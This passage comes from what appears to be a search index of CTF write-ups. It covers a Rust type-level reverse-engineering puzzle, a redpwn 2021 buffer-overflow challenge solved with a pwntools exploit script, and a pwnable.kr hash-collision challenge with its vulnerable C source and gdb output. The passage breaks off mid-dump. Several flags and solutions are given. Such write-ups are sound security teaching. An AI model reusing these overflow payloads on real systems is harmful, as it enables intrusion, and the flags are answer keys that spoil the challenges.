for Char6 { const CHAR: char = '6'; } type Char7 = S<S<S<S<S<S<S<S<Z>>>>>>>>; impl AsChar for Char7 { const CHAR: char = '7'; } type Char8 = S<S<S<S<S<S<S<S<S<Z>>>>>>>>>; impl AsChar for Char8 { const CHAR: char = '8'; } type Char9 = mkout!(Add, mkout!(Mul, Ten, S<Z>), Z); impl AsChar for Char9 { const CHAR: char = '9'; } type CharA = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<Z>); impl AsChar for CharA { const CHAR: char = 'a'; } type CharB = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<Z>>); impl AsChar for CharB { const CHAR: char = 'b'; } type CharC = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<Z>>>); impl AsChar for CharC { const CHAR: char = 'c'; } type CharD = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<Z>>>>); impl AsChar for CharD { const CHAR: char = 'd'; } type CharE = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<Z>>>>>); impl AsChar for CharE { const CHAR: char = 'e'; } type CharF = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<Z>>>>>>); impl AsChar for CharF { const CHAR: char = 'f'; } type CharG = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<S<Z>>>>>>>); impl AsChar for CharG { const CHAR: char = 'g'; } type CharH = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<S<S<Z>>>>>>>>); impl AsChar for CharH { const CHAR: char = 'h'; } type CharI = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<S<S<S<Z>>>>>>>>>); impl AsChar for CharI { const CHAR: char = 'i'; } type CharJ = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), Z); impl AsChar for CharJ { const CHAR: char = 'j'; } type CharK = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<Z>); impl AsChar for CharK { const CHAR: char = 'k'; } type CharL = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<Z>>); impl AsChar for CharL { const CHAR: char = 'l'; } type CharM = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<Z>>>); impl AsChar for CharM { const CHAR: char = 'm'; } type CharN = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<Z>>>>); impl AsChar for CharN { const CHAR: char = 'n'; } type CharO = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<Z>>>>>); impl AsChar for CharO { const CHAR: char = 'o'; } type CharP = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<Z>>>>>>); impl AsChar for CharP { const CHAR: char = 'p'; } type CharQ = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<Z>>>>>>>); impl AsChar for CharQ { const CHAR: char = 'q'; } type CharR = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<S<Z>>>>>>>>); impl AsChar for CharR { const CHAR: char = 'r'; } type CharS = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<S<S<Z>>>>>>>>>); impl AsChar for CharS { const CHAR: char = 's'; } type CharT = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), Z); impl AsChar for CharT { const CHAR: char = 't'; } type CharU = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<Z>); impl AsChar for CharU { const CHAR: char = 'u'; } type CharV = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<Z>>); impl AsChar for CharV { const CHAR: char = 'v'; } type CharW = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<S<Z>>>); impl AsChar for CharW { const CHAR: char = 'w'; } type CharX = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<S<S<Z>>>>); impl AsChar for CharX { const CHAR: char = 'x'; } type CharY = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<S<S<S<Z>>>>>); impl AsChar for CharY { const CHAR: char = 'y'; } type CharZ = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<S<S<S<S<Z>>>>>>); impl AsChar for CharZ { const CHAR: char = 'z'; } type Flag0 = CharL; type Flag1 = Char1; type Flag2 = CharS; type Flag3 = CharP; type Flag4 = Char_; type Flag5 = CharI; type Flag6 = CharN; type Flag7 = CharS; type Flag8 = CharI; type Flag9 = CharD; type Flag10 = Char3; type Flag11 = Char_; type Flag12 = CharR; type Flag13 = CharU; type Flag14 = CharS; type Flag15 = Char7; type Flag16 = Char_; type Flag17 = Char9; type Flag18 = CharA; type Flag19 = CharF; type Flag20 = CharH; type Flag21 = Char1; type Flag22 = CharN; type Flag23 = Char2; type Flag24 = Char3; type Constraints = mklist!(mklist!(AddFunc, Flag11, Flag13, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(MulFunc, Flag1, Flag9, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(SubFunc, Flag20, Flag4, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(SubFunc, Flag0, Flag5, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<Z>>>)), mklist!(SubFunc, Flag3, Flag16, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<Z>>>>>>)), mklist!(SubFunc, Flag12, Flag11, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(SubFunc, Flag18, Flag17, Z), mklist!(MulFunc, Flag20, Flag11, Z), mklist!(SubFunc, Flag5, Flag9, S<S<S<S<S<Z>>>>>), mklist!(MulFunc, Flag2, Flag4, S<S<S<S<S<Z>>>>>), mklist!(SubFunc, Flag0, Flag15, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<Z>>>>)), mklist!(SubFunc, Flag8, Flag24, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<Z>>>>>)), mklist!(AddFunc, Flag11, Flag7, mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<S<Z>>>)), mklist!(SubFunc, Flag14, Flag21, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<Z>>>>>>>)), mklist!(MulFunc, Flag4, Flag16, Z), mklist!(MulFunc, Flag21, Flag3, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<S<S<Z>>>>>>>>>)), mklist!(AddFunc, Flag24, Flag16, S<S<S<S<Z>>>>), mklist!(SubFunc, Flag3, Flag0, S<S<S<S<Z>>>>), mklist!(AddFunc, Flag11, Flag10, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<Z>>>)), mklist!(SubFunc, Flag7, Flag15, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<Z>)), mklist!(AddFunc, Flag18, Flag5, mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), Z)), mklist!(MulFunc, Flag18, Flag11, S<S<S<S<S<Z>>>>>), mklist!(SubFunc, Flag7, Flag21, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<Z>>>>>>>)), mklist!(MulFunc, Flag13, Flag18, mkout!(Add, mkout!(Mul, Hundred, S<S<S<Z>>>), mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<Z>))), mklist!(SubFunc, Flag20, Flag15, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<Z>>>)), mklist!(SubFunc, Flag19, Flag23, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<Z>>>)), mklist!(AddFunc, Flag14, Flag20, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<Z>>>>>>>)), mklist!(MulFunc, Flag21, Flag4, mkout!(Add, mkout!(Mul, Ten, S<Z>), Z)), mklist!(AddFunc, Flag10, Flag2, mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<S<Z>>>)), mklist!(SubFunc, Flag20, Flag10, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<Z>>>>)), mklist!(MulFunc, Flag17, Flag0, mkout!(Add, mkout!(Mul, Hundred, S<S<Z>>), mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<S<S<S<Z>>>>>>>>>))), mklist!(SubFunc, Flag22, Flag23, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<Z>)), mklist!(MulFunc, Flag15, Flag18, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<S<S<S<S<Z>>>>>>>>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(AddFunc, Flag12, Flag6, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<Z>>>>>>)), mklist!(MulFunc, Flag22, Flag24, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<S<S<S<S<S<Z>>>>>>>>>), S<S<S<S<S<S<Z>>>>>>)), mklist!(MulFunc, Flag0, Flag23, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<S<S<Z>>>>>>), S<S<S<S<S<S<Z>>>>>>)), mklist!(MulFunc, Flag0, Flag5, mkout!(Add, mkout!(Mul, Hundred, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(SubFunc, Flag8, Flag11, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<S<S<S<Z>>>>>>>>>)), mklist!(AddFunc, Flag19, Flag13, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<Z>>>>>>>)), mklist!(SubFunc, Flag7, Flag12, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<Z>)), mklist!(MulFunc, Flag17, Flag22, mkout!(Add, mkout!(Mul, Hundred, S<S<Z>>), mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), Z))), mklist!(AddFunc, Flag16, Flag14, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<S<S<Z>>>>>>>>>)), mklist!(AddFunc, Flag24, Flag18, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<Z>>>>)), mklist!(SubFunc, Flag19, Flag4, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<Z>>>>>>)), mklist!(AddFunc, Flag24, Flag3, mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), Z)), mklist!(SubFunc, Flag0, Flag16, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<Z>>)), mklist!(MulFunc, Flag10, Flag5, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<S<S<S<Z>>>>>>>), S<S<S<S<S<S<Z>>>>>>)), mklist!(SubFunc, Flag20, Flag19, S<S<Z>>), mklist!(MulFunc, Flag12, Flag16, S<S<S<S<S<Z>>>>>), mklist!(MulFunc, Flag24, Flag12, mkout!(Add, mkout!(Mul, Hundred, S<Z>), mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<Z>>))), mklist!(SubFunc, Flag24, Flag16, S<S<S<S<Z>>>>), mklist!(AddFunc, Flag12, Flag15, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<Z>>>>>)), mklist!(AddFunc, Flag1, Flag20, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), Z)), mklist!(MulFunc, Flag1, Flag17, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), Z)), mklist!(AddFunc, Flag5, Flag11, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<Z>>>>>>)), mklist!(SubFunc, Flag5, Flag18, S<S<S<S<S<S<S<S<Z>>>>>>>>), mklist!(AddFunc, Flag16, Flag22, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<Z>>>>)), mklist!(MulFunc, Flag14, Flag3, mkout!(Add, mkout!(Mul, Hundred, S<S<S<S<S<S<S<Z>>>>>>>), mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<Z>>>>>>>))), mklist!(MulFunc, Flag6, Flag21, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(AddFunc, Flag6, Flag22, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<S<Z>>>>>>>>))); fn print_flag() { println!(\"dice{{{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}}}\", Flag0::CHAR, Flag1::CHAR, Flag2::CHAR, Flag3::CHAR, Flag4::CHAR, Flag5::CHAR, Flag6::CHAR, Flag7::CHAR, Flag8::CHAR, Flag9::CHAR, Flag10::CHAR, Flag11::CHAR, Flag12::CHAR, Flag13::CHAR, Flag14::CHAR, Flag15::CHAR, Flag16::CHAR, Flag17::CHAR, Flag18::CHAR, Flag19::CHAR, Flag20::CHAR, Flag21::CHAR, Flag22::CHAR, Flag23::CHAR, Flag24::CHAR); } type NConstraints = mklist!(ApplyFunc, MapFunc, mklist!(ConsFunc, MkNConstraint, mkcons!(FirstOf3, Constraints))); type EConstraints = mklist!(ApplyFunc, MapFunc, mklist!(ConsFunc, MkConstraint, mkcons!(RestOf3, Constraints))); type Program = mklist!(GetLast, mklist!(ApplyFunc, GetLast, NConstraints), mklist!(ApplyFunc, GetLast, EConstraints)); type Fin = mkout!(Eval, Program); fn main() { print_flag(); let _: Fin = panic!(); } It essentially creates a lisp-like language, and a list of 60 constraints. The constraints are of the form (flag[i] op flag[j]) cmp x , where op is addition, subtraction, or multiplication, and cmp is either equality or inequality. Every 3rd constraint is inequality and the rest are equality.","title":"rev/typed"},{"location":"Writeup/Binary%20Exploitation/beginner-generic-pwn-number-0/","text":"beginner-generic-pwn-number-0 Category: Binary Exploitation Source: redpwn CTF 2021 Author: pepsipu Score: 5 Description rob keeps making me write beginner pwn! i'll show him... nc mc.ax 31199 Downloads beginner-generic-pwn-number-0 beginner-generic-pwn-number-0.c Solution So I know this was a buffer overflow because entering a lot of \"A\" created a segmentation fault. from pwn import * flag_address = 0xffffffffffffffff payload = b\"A\" * 40 # binary = process(\"./beginner-generic-pwn-number-0\") binary = remote(\"mc.ax\", 31199) print(binary.recvuntil(\":(\\n\")) binary.sendline(payload + p64(flag_address)) binary.interactive() # Normal Response # b'\"\\xf0\\x9d\\x98\\xb1\\xf0\\x9d\\x98\\xad\\xf0\\x9d\\x98\\xa6\\xf0\\x9d\\x98\\xa2\\xf0\\x9d\\x98\\xb4\\xf0\\x9d\\x98\\xa6 \\xf0\\x9d\\x98\\xb8\\xf0\\x9d\\x98\\xb3\\xf0\\x9d\\x98\\xaa\\xf0\\x9d\\x98\\xb5\\xf0\\x9d\\x98\\xa6 \\xf0\\x9d\\x98\\xa2 \\xf0\\x9d\\x98\\xb1\\xf0\\x9d\\x98\\xb8\\xf0\\x9d\\x98\\xaf \\xf0\\x9d\\x98\\xb4\\xf0\\x9d\\x98\\xb0\\xf0\\x9d\\x98\\xae\\xf0\\x9d\\x98\\xa6\\xf0\\x9d\\x98\\xb5\\xf0\\x9d\\x98\\xaa\\xf0\\x9d\\x98\\xae\\xf0\\x9d\\x98\\xa6 \\xf0\\x9d\\x98\\xb5\\xf0\\x9d\\x98\\xa9\\xf0\\x9d\\x98\\xaa\\xf0\\x9d\\x98\\xb4 \\xf0\\x9d\\x98\\xb8\\xf0\\x9d\\x98\\xa6\\xf0\\x9d\\x98\\xa6\\xf0\\x9d\\x98\\xac\"\\nrob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!\\ncan you write me a heartfelt message to cheer me up? :(\\n' Flag: flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me} Reference Writeup from https://codingmace.gitbook.io/masterward/ctf/2021/redpwn-2021#beginner-generic-pwn-number-0","title":"beginner-generic-pwn-number-0"},{"location":"Writeup/Binary%20Exploitation/beginner-generic-pwn-number-0/#beginner-generic-pwn-number-0","text":"Category: Binary Exploitation Source: redpwn CTF 2021 Author: pepsipu Score: 5","title":"beginner-generic-pwn-number-0"},{"location":"Writeup/Binary%20Exploitation/beginner-generic-pwn-number-0/#description","text":"rob keeps making me write beginner pwn! i'll show him... nc mc.ax 31199","title":"Description"},{"location":"Writeup/Binary%20Exploitation/beginner-generic-pwn-number-0/#downloads","text":"beginner-generic-pwn-number-0 beginner-generic-pwn-number-0.c","title":"Downloads"},{"location":"Writeup/Binary%20Exploitation/beginner-generic-pwn-number-0/#solution","text":"So I know this was a buffer overflow because entering a lot of \"A\" created a segmentation fault. from pwn import * flag_address = 0xffffffffffffffff payload = b\"A\" * 40 # binary = process(\"./beginner-generic-pwn-number-0\") binary = remote(\"mc.ax\", 31199) print(binary.recvuntil(\":(\\n\")) binary.sendline(payload + p64(flag_address)) binary.interactive() # Normal Response # b'\"\\xf0\\x9d\\x98\\xb1\\xf0\\x9d\\x98\\xad\\xf0\\x9d\\x98\\xa6\\xf0\\x9d\\x98\\xa2\\xf0\\x9d\\x98\\xb4\\xf0\\x9d\\x98\\xa6 \\xf0\\x9d\\x98\\xb8\\xf0\\x9d\\x98\\xb3\\xf0\\x9d\\x98\\xaa\\xf0\\x9d\\x98\\xb5\\xf0\\x9d\\x98\\xa6 \\xf0\\x9d\\x98\\xa2 \\xf0\\x9d\\x98\\xb1\\xf0\\x9d\\x98\\xb8\\xf0\\x9d\\x98\\xaf \\xf0\\x9d\\x98\\xb4\\xf0\\x9d\\x98\\xb0\\xf0\\x9d\\x98\\xae\\xf0\\x9d\\x98\\xa6\\xf0\\x9d\\x98\\xb5\\xf0\\x9d\\x98\\xaa\\xf0\\x9d\\x98\\xae\\xf0\\x9d\\x98\\xa6 \\xf0\\x9d\\x98\\xb5\\xf0\\x9d\\x98\\xa9\\xf0\\x9d\\x98\\xaa\\xf0\\x9d\\x98\\xb4 \\xf0\\x9d\\x98\\xb8\\xf0\\x9d\\x98\\xa6\\xf0\\x9d\\x98\\xa6\\xf0\\x9d\\x98\\xac\"\\nrob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!\\ncan you write me a heartfelt message to cheer me up? :(\\n' Flag: flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}","title":"Solution"},{"location":"Writeup/Binary%20Exploitation/beginner-generic-pwn-number-0/#reference","text":"Writeup from https://codingmace.gitbook.io/masterward/ctf/2021/redpwn-2021#beginner-generic-pwn-number-0","title":"Reference"},{"location":"Writeup/Binary%20Exploitation/collision/","text":"collision Category: Binary Exploitation Source: pwnable.kr Author: unknown Score: 5 Description Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) Introduction Hey guys this is my write-up for a challenge called collision from pwnable.kr . It\u2019s a very simple challenge, we need a password to make the program read the flag, the function that validates the given password is vulnerable to hash collision so we will exploit it. Challenge Description : Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) Code Analysis, Tests col.c : #include <stdio.h> #include <string.h> unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i<5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc<2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } main() : Starting by the main function it checks if we have given the program an input and it checks if our input\u2019s length is exactly 20 bytes. Then it checks if the return value of check_password(our input) is equal to hashcode , if we pass that check it will read the flag, otherwise it will print wrong passcode. and exit. int main(int argc, char* argv[]){ if(argc<2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } Looking up, we can see the declaration of the variable hashcode : unsigned long hashcode = 0x21DD09EC; That\u2019s a hex value, let\u2019s convert it to decimal with python : >>> 0x21DD09EC 568134124 So we need our input to be 20 bytes length and we also need to make the function check_password return 568134124 when our input is given to it. Let\u2019s quickly try to simulate that in gdb . I ran the program and set a breakpoint at main : gef\u27a4 break main Breakpoint 1 at 0x11b3 gef\u27a4 r \"AAAAAAAAAAAAAAAAAAAA\" Starting program: /root/Desktop/pwnable.kr/collision/col \"AAAAAAAAAAAAAAAAAAAA\" Breakpoint 1, 0x00005555555551b3 in main () [ Legend: Modified register | Code | Heap | Stack | String ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 registers \u2500\u2500\u2500\u2500 $rax : 0x00005555555551af \u2192 <main+0> push rbp $rbx : 0x0 $rcx : 0x00007ffff7fa9718 \u2192 0x00007ffff7faad80 \u2192 0x0000000000000000 $rdx : 0x00007fffffffe160 \u2192 0x00007fffffffe48b \u2192 \"SHELL=/bin/bash\" $rsp : 0x00007fffffffe060 \u2192 0x0000555555555260 \u2192 <__libc_csu_init+0> push r15 $rbp : 0x00007fffffffe060 \u2192 0x0000555555555260 \u2192 <__libc_csu_init+0> push r15 $rsi : 0x00007fffffffe148 \u2192 0x00007fffffffe44f \u2192 \"/root/Desktop/pwnable.kr/collision/col\" $rdi : 0x2 $rip : 0x00005555555551b3 \u2192 <main+4> sub rsp, 0x10 $r8 : 0x00007ffff7faad80 \u2192 0x0000000000000000 $r9 : 0x00007ffff7faad80 \u2192 0x0000000000000000 $r10 : 0x0 $r11 : 0x00007ffff7f6b1b0 \u2192 0x0000800003400468 $r12 : 0x0000555555555080 \u2192 <_start+0> xor ebp, ebp $r13 : 0x00007fffffffe140 \u2192 0x0000000000000002 $r14 : 0x0 $r15 : 0x0 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 stack \u2500\u2500\u2500\u2500 0x00007fffffffe060\u2502+0x0000: 0x0000555555555260 \u2192 <__libc_csu_init+0> push r15 \u2190 $rsp, $rbp 0x00007fffffffe068\u2502+0x0008: 0x00007ffff7e1209b \u2192 <__libc_start_main+235> mov edi, eax 0x00007fffffffe070\u2502+0x0010: 0x0000000000000000 0x00007fffffffe078\u2502+0x0018: 0x00007fffffffe148 \u2192 0x00007fffffffe44f \u2192 \"/root/Desktop/pwnable.kr/collision/col\" 0x00007fffffffe080\u2502+0x0020: 0x0000000200040000 0x00007fffffffe088\u2502+0x0028: 0x00005555555551af \u2192 <main+0> push rbp 0x00007fffffffe090\u2502+0x0030: 0x0000000000000000 0x00007fffffffe098\u2502+0x0038: 0xf6e7f80b45a87e3d \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 code:x86:64 \u2500\u2500\u2500\u2500 0x5555555551ae <check_password+73> ret 0x5555555551af <main+0> push rbp 0x5555555551b0 <main+1> mov rbp, rsp \u2192 0x5555555551b3 <main+4> sub rsp, 0x10 0x5555555551b7 <main+8> mov DWORD PTR [rbp-0x4], edi 0x5555555551ba <main+11> mov QWORD PTR [rbp-0x10], rsi 0x5555555551be <main+15> cmp DWORD PTR [rbp-0x4], 0x1 0x5555555551c2 <main+19> jg 0x5555555551e6 <main+55> 0x5555555551c4 <main+21> mov rax, QWORD PTR [rbp-0x10] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u